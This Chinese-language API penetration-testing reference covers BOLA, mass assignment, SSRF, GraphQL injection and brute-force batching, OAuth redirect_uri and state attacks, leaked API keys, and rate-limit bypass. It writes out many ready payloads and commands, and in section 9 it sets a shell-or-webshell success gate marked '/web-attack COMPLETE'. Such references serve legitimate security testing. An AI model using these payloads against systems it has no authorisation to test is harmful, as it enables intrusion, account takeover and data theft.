# API 安全深度测试 详细参考

---

## 目录

1. OWASP API Top 10 (2023) 全十条
2. GraphQL 攻击
3. OAuth / OIDC 攻击
4. API Key 泄露利用
5. WebSocket 攻击
6. gRPC 攻击
7. Rate Limiting 绕过
8. API 版本与影子端点
9. RRE / 业务链递归
10. SOAP / WSDL
11. 工具速查

---

## 1. OWASP API Top 10 (2023) 全十条

### API1 — BOLA (Broken Object Level Authorization)

占API攻击约40%，最常见也最高危。

```
# 核心：改对象ID看到/改到别人的资源
GET /api/v1/users/1001/orders         # 自己的订单
GET /api/v1/users/1002/orders         # 改ID → 看到别人的

# 系统化测试
# 1. 注册两个账户A和B
# 2. 用A的token访问B的资源ID → 返回200 = BOLA
# 3. 遍历ID类型：数字递增、UUID、slug

# ID格式绕过
# 数字: 1001 → 1002
# UUID: 先从列表接口泄露其他用户UUID
# Slug: /api/users/john-doe → /api/users/admin

# 非直接ID：嵌套资源
GET /api/v1/shops/1/orders/1001       # 改shop ID也可能越权
POST /api/v1/orders/1001/refund       # 操作型越权(退别人的单)

# 自动化
# Burp插件 Autorize：双账户自动检测越权
# 1. 低权限cookie设为Autorize的cookie
# 2. 高权限浏览器正常操作
# 3. Autorize自动重放低权限cookie → 标记哪些请求越权成功
```

### API2 — Broken Authentication

```
# 认证绕过测试清单
# 1. JWT攻击（见 jwt.md）
# 2. API Key在URL参数中暴露（日志/Referer泄露）
# 3. 无认证端点（直接访问不带token的/api/admin/*）
# 4. 弱密码/默认凭据
# 5. 缺少限速的登录接口 → 爆破

# Token泄露路径
# - Referer header（从HTTPS页面跳转到HTTP时token泄露）
# - URL参数中的token被记录到日志/WAF/CDN
# - CORS宽松 → JS跨域读取含token的响应
# - 浏览器历史/缓存

# 密码重置流程
POST /api/v1/forgot-password         {"email":"victim@corp.com"}
# 拦截响应 → 有些API直接返回重置token
# 改Host header → 重置链接指向攻击者域名
POST /api/v1/reset-password          {"token":"xxx","newPassword":"hacked"}
```

### API3 — Broken Object Property Level Authorization

合并了2019版的 Excessive Data Exposure + Mass Assignment。

```
# Excessive Data Exposure（响应返回多余字段）
GET /api/v1/users/me
# 响应包含：password_hash, ssn, internal_id, role, isAdmin
# 前端只显示name/email，但API返回了全部 → Burp看响应原文

# Mass Assignment（请求多传字段）
# 正常注册
POST /api/v1/register
{"username":"test","password":"test"}

# 攻击：多传字段
POST /api/v1/register
{"username":"test","password":"test","role":"admin","isVerified":true,"balance":99999}

# 找可利用字段：
# 1. 看GET响应里有哪些字段
# 2. 看API文档/Swagger里的model定义
# 3. 把响应字段全部塞进POST/PUT请求试

# 常见高价值字段
role / is_admin / isActive / verified / email_verified
balance / credits / discount
org_id / tenant_id（跨租户）
permissions[] / scopes[]
```

### API4 — Unrestricted Resource Consumption

```
# 无限速/无限制的资源消耗
# 1. 短信验证码接口无限发 → 话费耗尽
# 2. 文件上传无大小限制 → 存储耗尽
# 3. 批量查询无分页限制 → ?limit=999999 拉全量数据
# 4. 导出功能无限制 → /api/export?format=csv 导出百万条
# 5. 复杂查询无超时 → 构造慢查询DoS

# 测试
GET /api/v1/users?limit=10          # 正常
GET /api/v1/users?limit=100000      # 改大
GET /api/v1/users?page=1&per_page=0 # 0或负数
POST /api/v1/search {"query":"a"}   # 极短查询返回大量结果
```

### API5 — Broken Function Level Authorization (BFLA)

```
# 普通用户调管理员功能
GET  /api/v1/admin/users                    # 列所有用户
POST /api/v1/admin/users                    # 创建用户
DELETE /api/v1/users/1002                   # 删别人
PUT  /api/v1/users/1002 {"role":"admin"}    # 提升权限

# 发现隐藏管理端点
# 1. Swagger/OpenAPI文档泄露（/swagger.json, /api-docs）
# 2. JS源码中的API路径（搜索 /api/ /admin/ /internal/）
# 3. 路径猜测：/api/v1/users → /api/v1/admin/users
# 4. 改HTTP方法：GET能访问？试DELETE/PUT/PATCH

# 水平 vs 垂直
# BOLA = 水平越权（同角色看别人数据）
# BFLA = 垂直越权（低权限用高权限功能）
```

### API6 — Unrestricted Access to Sensitive Business Flows

```
# 业务逻辑滥用（接口本身没bug，但被自动化大规模利用）
# 1. 抢购/秒杀：脚本并发调 POST /api/cart/add
# 2. 推荐奖励：批量注册 → 每个号拿推荐奖金
# 3. 预约抢占：脚本抢光所有时段
# 4. 优惠券滥用：批量领取/使用
# 5. 投票刷票：重复调投票接口

# 测试
# 用脚本并发调用业务接口，看有没有：
# - 设备指纹
# - 验证码
# - 行为分析
# - 频率限制
# 没有 → 可滥用
```

### API7 — Server Side Request Forgery (SSRF)

```
# API场景的SSRF
POST /api/v1/webhooks {"url":"http://169.254.169.254/latest/meta-data/"}
POST /api/v1/import  {"source":"http://internal-service:8080/admin"}
POST /api/v1/preview {"url":"file:///etc/passwd"}

# 详见 ssrf.md / xxe.md
```

### API8 — Security Misconfiguration

```
# API常见错配
# 1. 未禁用的DEBUG模式（返回stack trace/内部路径）
# 2. 默认CORS: Access-Control-Allow-Origin: *
# 3. 不必要的HTTP方法（OPTIONS返回 PUT/DELETE/TRACE）
# 4. 缺少安全头（无HSTS/CSP/X-Content-Type-Options）
# 5. 详细错误信息泄露框架版本/数据库类型
# 6. /swagger /graphiql /playground 暴露在生产环境
# 7. TLS配置弱（接受SSLv3/弱密码套件）

# 快检
curl -s -D- http://TARGET/api/ | grep -i "x-powered-by\|server\|x-debug\|access-control"
OPTIONS http://TARGET/api/v1/users
```

### API9 — Improper Inventory Management

```
# 旧版本/影子API未下线
# v1已知有漏洞但未下线
/api/v1/users    # 旧版，无鉴权
/api/v2/users    # 新版，有鉴权

# 测试路由
/api/v1/ /api/v2/ /api/v3/ /api/beta/ /api/internal/ /api/staging/ /api/test/
/api/mobile/v1/  # 移动端专用API（常有不同鉴权）
/api/partner/    # 合作伙伴API

# 发现影子端点
# - 搜JS源码中的API路径
# - Wayback Machine看历史API路径
# - 移动App反编译找硬编码端点
# - 搜GitHub/Postman公开的API集合
```

### API10 — Unsafe Consumption of APIs

```
# 信任第三方API数据导致被攻击
# 1. 第三方webhook payload中注入恶意数据
# 2. 上游API被入侵 → 返回恶意数据 → 你的系统被RCE
# 3. 未验证第三方返回的重定向URL
# 4. 第三方SDK中的漏洞

# 测试
# 如果你能控制第三方数据源（如webhook回调）
# 在返回数据中注入：SQLi payload / SSTI payload / XSS / 命令注入
# 看目标系统是否处理了你的恶意数据
```

---

## 2. GraphQL 攻击

### 2.1 端点发现

```
# 常见路径
/graphql  /graphiql  /playground  /api/graphql  /v1/graphql  /query
/graph  /gql  /graphql/console  /graphql/debug

ffuf -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
     -u http://TARGET/FUZZ -mc 200,405

# 指纹确认
curl -s -X POST http://TARGET/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __typename }"}'
# 返回 {"data":{"__typename":"Query"}} → 确认GraphQL
```

### 2.2 内省 (Introspection)

```
# 完整schema dump
{__schema{types{name,kind,fields{name,type{name,kind,ofType{name}}},inputFields{name,type{name}}}}}

# 精简版（列所有类型和字段）
{__schema{queryType{name},mutationType{name},types{name,fields{name,args{name,type{name}}}}}}

# 列所有mutation
{__schema{mutationType{fields{name,args{name,type{name,kind,ofType{name}}}}}}}

# 工具：InQL (Burp插件) 自动解析schema
# 工具：graphql-voyager 可视化schema关系图
```

### 2.3 内省被禁时的枚举

```
# Field Suggestion滥用（服务器返回建议字段）
{user{ussr}}
# 错误：Cannot query field "ussr". Did you mean "user", "users"?
# → 泄露真实字段名

# clairvoyance（自动化字段猜测）
clairvoyance -o schema.json -w wordlist.txt http://TARGET/graphql

# 手动fuzz常见字段名
query/mutation: users, user, me, login, register, createUser, deleteUser,
  updateUser, resetPassword, adminUsers, flag, secret, config, settings,
  orders, payments, transactions, upload, search
```

### 2.4 认证绕过与越权

```
# 无认证mutation
mutation { createUser(username:"admin2", password:"pass", role:"admin") { id } }

# IDOR via GraphQL
{ user(id: 1002) { email, password_hash, ssn } }

# 嵌套越权（通过关联关系访问）
{ user(id: 1001) { orders { payment { card_number } } } }

# Mutation越权
mutation { updateUser(id: 1002, input: {role: "admin"}) { id role } }
mutation { deleteUser(id: 1002) { success } }
```

### 2.5 注入

```
# SQLi via GraphQL
{ user(name: "' OR 1=1 --") { id email } }
mutation { login(user: "admin' OR '1'='1", pass: "x") { token } }

# SSTI (如果查询结果被模板渲染)
{ user(name: "{{7*7}}") { bio } }

# NoSQL注入
{ user(filter: "{\"username\": {\"$ne\": null}}") { id email } }

# DQL注入 (Dgraph — CVE-2026-41328)
# 通过mutation key注入DQL查询 → 全量数据读取
```

### 2.6 批量攻击 (Batching & Aliases)

```
# Alias爆破（单请求多次操作，绕per-request限速）
query {
  a1: login(user: "admin", pass: "password1") { token }
  a2: login(user: "admin", pass: "password2") { token }
  a3: login(user: "admin", pass: "password3") { token }
  # ... 1000个alias = 1个HTTP请求里1000次登录
}

# Array Batching（另一种批量格式）
[
  {"query": "mutation { login(user:\"admin\",pass:\"pass1\"){token} }"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass2\"){token} }"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass3\"){token} }"}
]

# 批量数据提取
query {
  u1: user(id:1) { email ssn }
  u2: user(id:2) { email ssn }
  u3: user(id:3) { email ssn }
}
```

### 2.7 DoS

```
# 深度嵌套查询
{ user { posts { comments { user { posts { comments { user { posts } } } } } } } }

# 循环引用（如果schema有User→Posts→Author→Posts...）
# 构造10层嵌套 → 指数级数据库查询

# 宽度爆炸（请求大量字段/别名）
{ u1:users{id} u2:users{id} ... u10000:users{id} }

# Fragment循环（某些实现不检测）
fragment A on User { ...B }
fragment B on User { ...A }
```

### 2.8 文件上传

```
# GraphQL multipart upload (graphql-upload库)
# 如果未验证文件类型 → 上传webshell
# Content-Type: multipart/form-data
# operations: {"query":"mutation($file:Upload!){uploadFile(file:$file){url}}","variables":{"file":null}}
# map: {"0":["variables.file"]}
# 0: @malicious.php
```

### 2.9 Subscription滥用

```
# WebSocket订阅（ws://TARGET/graphql）
{"type":"connection_init","payload":{"Authorization":"Bearer TOKEN"}}
{"type":"subscribe","id":"1","payload":{"query":"subscription{newMessage{content from}}"}}

# 测试：
# 1. 无认证能订阅？
# 2. 能订阅其他用户的数据？
# 3. 大量订阅 → 资源耗尽
```

---

## 3. OAuth / OIDC 攻击

### 3.1 redirect_uri 操纵

```
# 核心：控制redirect_uri → 截获authorization code/token

# 严格匹配被绕过的方式
# 只验证域名前缀
https://app.com/callback → https://app.com/callback/../../../evil.com
https://app.com/callback → https://app.com.evil.com

# 子目录绕过
https://app.com/callback → https://app.com/callback/../../other-page

# 开放重定向链
https://app.com/callback → https://app.com/redirect?url=https://evil.com
# 合法redirect_uri → 通过应用自身的开放重定向跳到攻击者

# 参数污染
?redirect_uri=https://app.com/callback&redirect_uri=https://evil.com

# fragment (#) 技巧
# implicit flow的token在fragment里返回
# 如果能控制redirect到的页面，JS可以读取location.hash

# 测试流程
# 1. 正常走OAuth流程，记录redirect_uri
# 2. 改成 https://evil.com → 被拒绝
# 3. 尝试上述绕过变体
# 4. 成功 → 截获code → 用code换token → ATO
```

### 3.2 state参数缺失/不验证 → CSRF

```
# 正常流程应该有：
/authorize?response_type=code&client_id=xxx&redirect_uri=xxx&state=RANDOM

# 如果无state或不验证：
# 1. 攻击者用自己的OAuth flow获取一个authorization code
# 2. 构造链接：/callback?code=ATTACKER_CODE
# 3. 诱骗受害者点击 → 受害者账户绑定攻击者的OAuth
# 4. 攻击者用自己的OAuth登录 → 进入受害者账户

# 测试：删除state参数 → 流程仍然成功 = 可CSRF
```

### 3.3 Authorization Code 窃取

```
# code在URL中 → 通过Referer泄露
# 用户登录后: /callback?code=AUTH_CODE
# 页面如果有外部资源(图片/JS) → Referer: /callback?code=AUTH_CODE
# 攻击者控制的外部资源拿到code

# code重放
# 正常：code只能用一次
# 测试：同一个code发两次 /token 请求 → 第二次成功 = code未失效
```

### 3.4 implicit flow token泄露

```
# implicit flow直接返回token（不经过server端交换）
/callback#access_token=xxx&token_type=bearer

# 风险：token在URL fragment中
# 1. 浏览器历史记录
# 2. 通过Referer泄露
# 3. 配合redirect_uri操纵直接截获

# 测试：能否强制使用implicit flow？
/authorize?response_type=token    # 而非 response_type=code
# 如果authorization server同时支持两种 → 攻击者选implicit
```

### 3.5 PKCE绕过

```
# PKCE防止authorization code被截获后利用
# 如果可选而非强制：
# 1. 发送authorize请求时不带code_challenge
# 2. token交换时不带code_verifier
# 3. 如果成功 → PKCE未强制 = code可被截获利用

# code_verifier降级
# 正常：S256 (SHA256)
# 攻击：改 code_challenge_method=plain → verifier明文传输
```

### 3.6 Scope提升

```
# 请求额外scope
/authorize?scope=openid+profile+email+admin
# 如果authorization server不验证client允许的scope → 获得admin权限

# Token scope检查
# 拿到access_token后 → 用它访问高权限端点
# 即使scope只有read → 试write操作
```

### 3.7 Client Secret泄露

```
# 常见泄露位置
# 1. 移动App反编译 → 硬编码client_secret
# 2. JS前端源码
# 3. GitHub / GitLab公开仓库
# 4. .env文件泄露
# 5. Swagger文档中的示例

# 拿到client_secret后
# → 可以直接用client_credentials grant获取token
# → 可以窃取authorization code后换token
```

---

## 4. API Key 泄露利用

```
# 常见泄露位置
# 1. GitHub/GitLab搜索
#    org:target "api_key" / "apikey" / "x-api-key" / "authorization: bearer"
# 2. JS源码（webpack bundle）
# 3. 移动App反编译（APK/IPA）
# 4. Postman公开集合（postman.com/explore）
# 5. .env / config.yaml / docker-compose.yml 泄露
# 6. Swagger文档中的示例请求

# 自动扫描
trufflehog git https://github.com/target/repo
gitleaks detect --source=./repo --report-path=leaks.json

# 利用
# 1. 确认key是否有效
curl -H "X-API-Key: <key>" http://TARGET/api/v1/users/me
# 2. 枚举权限范围
# 3. 用key调用高权限接口
```

---

## 5. WebSocket 攻击

```
# 发现WebSocket
# 看网络请求中的 ws:// 或 wss:// 连接
# 常见路径: /ws /socket /socket.io /cable /hub

# 认证测试
# 1. 不带token连接 → 能收到数据？
# 2. 用过期/无效token → 仍然能用？
# 3. 连接建立后token过期 → 连接不断？

# 跨站WebSocket劫持 (CSWSH)
# 类似CSRF但针对WebSocket
# 如果WebSocket连接仅靠cookie认证（无Origin检查）
# → 构造恶意页面自动建立WS连接 → 读取受害者数据

# 注入
# WS消息中的参数同样可能有SQLi/XSS/命令注入
{"action":"search","query":"' OR 1=1 --"}
```

---

## 6. gRPC 攻击

```
# 发现gRPC
# 默认端口50051，HTTP/2协议
# curl: curl -v --http2-prior-knowledge http://TARGET:50051

# 反射枚举（类似GraphQL内省）
grpcurl -plaintext TARGET:50051 list                           # 列出所有服务
grpcurl -plaintext TARGET:50051 describe <service.Name>        # 描述服务方法
grpcurl -plaintext TARGET:50051 <service.Name/MethodName>      # 调用方法

# 未认证访问
grpcurl -plaintext TARGET:50051 admin.AdminService/ListUsers

# 如果需要.proto文件
# 从反射获取 / 从源码中找 / 从二进制中提取
```

---

## 7. Rate Limiting 绕过

```
# IP轮换
X-Forwarded-For: 127.0.0.1        # 每次请求改IP
X-Real-IP: 10.0.0.1
X-Originating-IP: 1.2.3.4
X-Client-IP: 5.6.7.8
True-Client-IP: 9.10.11.12

# 端点变体
/api/v1/login → /api/v1/LOGIN → /API/v1/login
/api/v1/login → /api/v1/login/ → /api/v1/login?

# 参数填充
POST /api/v1/login {"user":"admin","pass":"x"}
POST /api/v1/login {"user":"admin","pass":"x","extra":"random1"}
# 不同请求体 → 可能绕过基于body hash的限速

# HTTP方法切换
POST /api/v1/login → PUT /api/v1/login

# 编码变体
/api/v1/login → /api/v1/%6Cogin

# Unicode填充
{"user":"admin","pass":"x"} → {"user":"admin\u0000","pass":"x"}

# GraphQL alias/batching（见上方GraphQL章节）
```

---

## 8. API 版本与影子端点

```
# 旧版API路径
/api/v1/ /api/v2/ /api/v3/ /api/v0/ /api/beta/ /api/alpha/
/api/internal/ /api/private/ /api/staging/ /api/test/ /api/dev/
/api/mobile/ /api/legacy/ /api/old/ /api/deprecated/

# 发现技巧
# 1. Wayback Machine: web.archive.org/web/*/target.com/api/*
# 2. Google: site:target.com inurl:api
# 3. JS源码: grep -r "/api/" *.js
# 4. 移动App反编译: grep -r "api" classes.dex
# 5. Swagger/OpenAPI历史版本

# 影子端点（开发遗留）
# /api/v1/debug  /api/v1/test  /api/v1/healthz  /api/v1/metrics
# /api/v1/graphiql  /api/v1/swagger  /api/v1/actuator (Spring Boot)

ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://TARGET/api/FUZZ -mc 200,301,302,403,405
```

---

## 9. RRE — Recursive Request Exploits / 业务链递归

RRE不是单端点漏洞，而是从**高价值受保护输出反向追踪它依赖的请求链**，寻找上游某一步的鉴权断层。

典型：

```text
protected stream / download / entitlement
        ↑
request D: entitlement token
        ↑
request C: asset/session id
        ↑
request B: user/event metadata
        ↑
request A: low-trust / unauthenticated input
```

### 手工流程

1. 先正常登录并访问高价值资源。
2. 在 Burp HTTP history 找出最终资源请求需要的关键 token/id。
3. 反向找“这个值是谁生成的”。
4. 对每个上游请求分别测试：

```text
删除认证
替换为低权限认证
换另一个session
重放旧token
跳过中间步骤
修改最早的low-trust input
```

5. 如果一条未授权/低权限请求最终能重新生成高价值 entitlement → 形成 RRE。

### 官方公开 Burp extension

```bash
git clone https://github.com/jumpycastle/rre-burp.git
```

Burp Professional + Jython 环境中加载 `rre.py`：

```text
Extensions → Add → Python → rre.py
```

然后：

```text
正常访问受保护资源
→ 右键选择与 entitlement 相关参数
→ RRE extension 递归追踪来源
→ Extensions/Output 查看链
```

### Web-attack 成功门控

RRE 本身常先得到付费/权限绕过，不一定直接 Shell。继续检查获得的高权限上下文是否暴露：

```text
admin API
模板/插件编辑
文件上传
debug/command endpoint
CI/build hook
```

能推进到命令执行/上传 WebShell → Shell → `/web-attack COMPLETE`。

---

## 10. SOAP / WSDL

发现 `.asmx`、`?wsdl`、`SOAPAction`、`application/soap+xml` 后，不要只当“老接口”。先从 WSDL 枚举完整 operation/schema。

```bash
curl -s 'http://TARGET/service.asmx?WSDL' -o service.wsdl
grep -Ei 'operation|soapAction|complexType|element name=' service.wsdl
```

重点：

```text
未授权管理operation
隐藏/legacy method
XXE/XML parser
SOAPAction与Body operation不一致
对象/类型反序列化
文件/URL参数 → SSRF/LFI
业务越权
```

SOAP/XML 外部实体 → `xxe.md`。

如果 WSDL 暴露管理操作，优先构造**正常 SOAP request**做鉴权差异，不要一开始就 fuzz XML parser。

---

## 11. 工具速查

| 工具 | 用途 |
|---|---|
| Burp Autorize | 双账户自动越权检测(BOLA/BFLA) |
| Burp InQL | GraphQL内省+攻击 |
| Postman/Insomnia | API手动测试 |
| graphql-voyager | GraphQL schema可视化 |
| clairvoyance | GraphQL内省被禁时字段猜测 |
| grpcurl | gRPC服务枚举+调用 |
| jwt_tool | JWT全套攻击 |
| nuclei | API CVE模板扫描 |
| Arjun | 隐藏参数发现 |
| kiterunner | API路由语义发现 |
| rre-burp | 递归追踪业务/API entitlement 链 |
| XSW / SAML Raider | SAML Signature Wrapping测试 |
| mitmproxy2swagger | 从流量自动生成OpenAPI文档 |
| trufflehog / gitleaks | API Key泄露扫描 |
